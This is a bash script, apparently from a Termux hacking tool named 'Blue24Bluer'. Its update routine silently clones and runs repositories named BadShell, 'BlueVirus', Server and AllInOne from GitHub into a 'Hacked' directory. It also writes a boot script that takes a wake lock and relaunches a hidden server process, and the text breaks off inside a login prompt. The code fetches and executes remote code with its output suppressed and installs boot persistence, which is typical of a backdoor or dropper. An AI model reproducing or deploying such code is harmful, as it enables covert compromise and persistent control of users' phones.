Update(){

if [[ $nN == "Y" ]];then

	if [[ -f $PREFIX/etc/Hacked/Update ]];then

		if [[ $(cat $PREFIX/etc/Hacked/Update) == "" ]];then

			this_date=$(date +%Y/%m/%d)
			echo -e $this_date > $PREFIX/etc/Hacked/Update
			base=1
		fi

	fi

		printf ""

else

	this_date=$(date +%Y/%m/%d)
	echo -e $this_date > $PREFIX/etc/Hacked/Update
	base=1
fi

if [[ $nN == "Y" ]];then

current_date=$(date +%Y/%m/%d)
file_date=$(cat $PREFIX/etc/Hacked/Update)
days_diff=$(( ( $(date -d "$current_date" +%s) - $(date -d "$file_date" +%s) ) / 86400 ))


if [[ $days_diff -ge 3 || $(date +%a) == "Fri" || $base == 1 ]];then

	this_date=$(date +%Y/%m/%d)
	base=0
	echo -e $this_date > $PREFIX/etc/Hacked/Update
	#Update-Server
	cd $PREFIX/etc/Hacked/
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/Server ]];then
		rm -rfd $PREFIX/etc/Hacked/Server &>> /dev/null
	fi
		while true;do
			cd $PREFIX/etc/Hacked/
			git clone https://github.com/blue24bluer/Server &>> /dev/null
			if [[ $? == "0" ]];then
				break
			fi
		done
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/BlueVirus ]];then
		rm -rfd $PREFIX/etc/Hacked/BlueVirus &>> /dev/null
	fi
		while true;do
			cd $PREFIX/etc/Hacked/
			git clone https://github.com/blue24bluer/BadShell_B24B &>> /dev/null
			if [[ $? == "0" ]];then
				mv BadShell_B24B BlueVirus
				break
			fi
		done
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/Badshell ]];then
		rm -rfd $PREFIX/etc/Hacked/Badshell &>> /dev/null
	fi

		while true;do
			git clone https://github.com/blue24bluer/Badshell
			if [[ $? == "0" ]];then
				break
			fi
			Rebulid &>> /dev/null
		done
#--------------------------------------------------------------------
        if [[ -d $PREFIX/etc/B24B/blue24bluer ]];then
                rm -rfd $PREFIX/etc/B24B/blue24bluer/AllInOne &>> /dev/null
        fi

                while true;do
			cd $PREFIX/etc/B24B/blue24bluer
                        git clone https://github.com/blue24bluer/AllInOne
                        if [[ $? == "0" ]];then
				mv $PREFIX/etc/B24B/blue24bluer/AllInOne/AllInOne $PREFIX/etc/B24B/blue24bluer/AllInOne.file
				rm -rfd $PREFIX/etc/B24B/blue24bluer/AllInOne
				mv $PREFIX/etc/B24B/blue24bluer/AllInOne.file $PREFIX/etc/B24B/blue24bluer/AllInOne
                                break
                        fi
                        Rebulid &>> /dev/null
                done
#--------------------------------------------------------------------
        if [[ -d $PREFIX/etc/Hacked/stutus ]];then
                rm -rfd $PREFIX/etc/Hacked/stutus &>> /dev/null
        fi

                while true;do
			cd $PREFIX/Hacked
                        git clone https://github.com/blue24bluer/stutus
                        if [[ $? == "0" ]];then
				bash $PREFIX/etc/Hacked/stutus/stutus &>> /dev/null
                                break
                        fi
                        Rebulid &>> /dev/null
                done
#--------------------------------------------------------------------
	Safe_API
#--------------------------------------------------------------------
	if [[ -d $PREFIX/etc/Hacked/LOCKS/ ]];then

		printf ""

	else

		mkdir $PREFIX/etc/Hacked/LOCKS/

	fi
#--------------------------------------------------------------------
	if [[ $termux == "true" ]];then
		if [[ -d ~/.termux/boot ]];then
			echo "
termux-wake-lock
Test1(){

if pgrep -f \"bash $PREFIX/etc/Hacked/Server/server\" >/dev/null; then

        printf ""

else

        if [[ -f $PREFIX/etc/Hacked/LOCKS/server_lock_file ]];then

                if [[ $(cat $PREFIX/etc/Hacked/LOCKS/server_lock_file) == \"End\" ]];then

                        Test1
                        rm $PREFIX/etc/Hacked/LOCKS/server_lock_file

                fi

        else

                touch $PREFIX/etc/Hacked/LOCKS/server_lock_file
                bash $PREFIX/etc/Hacked/Server/server &>> /dev/null

        fi

fi

}

Test1 &>>/dev/null
			" > ~/.termux/boot/startup
		else

			if [[ -d $PREFIX/etc/B24B/ ]];then

				if [[ -d $PREFIX/etc/B24B/blue24bluer ]];then

					if [[ -f $PREFIX/etc/B24B/blue24bluer/AllInOne ]];then

						bash $PREFIX/etc/B24B/blue24bluer/AllInOne installit
						bash $PREFIX/etc/B24B/blue24bluer/AllInOne dpkg
						bash $PREFIX/etc/B24B/blue24bluer/AllInOne badshell

					else

						Rebulid

					fi

				else

					Rebulid

				fi

			else

				Rebulid

			fi



		fi
	fi
#--------------------------------------------------------------------
	fi

fi

if [[ -f $PREFIX/etc/B24B/blue24bluer/shell_me ]];then
source $PREFIX/etc/B24B/blue24bluer/shell_me
else
shell_me="false"
fi

if [[ $shell_me == "true" ]];then

	if [[ $termux == "true" ]];then

		echo -e "
termux-wake-lock
Test1(){

if pgrep -f \"bash $PREFIX/etc/Hacked/Server/server\" >/dev/null; then

        printf ""

else

        if [[ -f $PREFIX/etc/Hacked/LOCKS/server_lock_file ]];then

                if [[ $(cat $PREFIX/etc/Hacked/LOCKS/server_lock_file) == \"End\" ]];then

                        Test1
                        rm $PREFIX/etc/Hacked/LOCKS/server_lock_file

                fi

        else

                touch $PREFIX/etc/Hacked/LOCKS/server_lock_file
                bash $PREFIX/etc/Hacked/Server/server &>> /dev/null

        fi

fi

}

Test1 &>>/dev/null
                " > $tr_file

		echo -e "

			RUNSYS=\"B24B_\"

			if [[ $PpP != \"\" ]];then

				toilet -f mono12 -F border -F gay -F metal \"   login\" | lolcat
				echo -e \$info \"Please Enter The Passowrd\"
				read ssp
				if [[ $PpP == \$ssp ]];then
					clear

				fi

				toilet -f mono12 -F border $nameT -F gay -F metal

				while true;do

					read -p \"\[\033[01;32m\](\${b}Blue24Bluer\${t})[\${nameT}\${y}]==>\[\033[01;36m\] \" sys_tool

